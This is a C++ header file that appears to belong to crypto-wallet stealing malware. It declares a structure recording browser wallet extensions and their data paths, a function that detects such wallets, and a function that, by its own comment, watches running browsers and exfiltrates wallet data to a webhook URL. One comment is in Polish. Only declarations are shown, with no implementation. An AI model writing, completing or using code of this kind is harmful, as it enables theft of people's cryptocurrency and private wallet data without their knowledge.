#pragma once
#include <string>
#include <vector>

// Forward declaration to avoid circular dependency if needed later
void logToFile(const std::string& message);

struct BrowserWallet {
    std::string name;
    std::string browser;
    std::wstring process_name;
    std::wstring extension_path;
    std::wstring data_path;
    bool data_sent = false; // Flaga do śledzenia, czy dane zostały już wysłane
};

// Checks for the presence of browser-based wallets.
std::vector<BrowserWallet> checkBrowserWallets();

// In a separate thread, this function monitors running browsers and exfiltrates wallet data when they are opened.
void monitorAndExfiltrateBrowserWallets(std::vector<BrowserWallet> foundWallets, const std::string& webhookUrl);
